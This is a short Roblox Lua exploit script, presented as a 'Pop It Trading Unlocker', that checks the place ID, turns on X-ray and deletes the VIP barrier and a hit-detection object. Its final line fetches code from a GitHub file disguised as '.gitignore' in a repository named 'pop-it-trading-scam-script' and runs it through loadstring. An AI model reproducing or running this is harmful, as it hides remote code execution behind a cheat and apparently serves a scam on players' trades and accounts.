local allowedPlaceId = 7346416636

if game.PlaceId ~= allowedPlaceId then
    game.Players.LocalPlayer:Kick("This game isn't supported with this script!")
    return
end

print("Pop It Trading Unlocker ehehhehehehe")
game.Players.LocalPlayer.XRay.Value = true
game.Workspace.Map.VIP:Destroy()
game.Workspace.GoldenToilet.HitDetect:Destroy()
wait(0.2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/refs/heads/main/.gitignore"))()
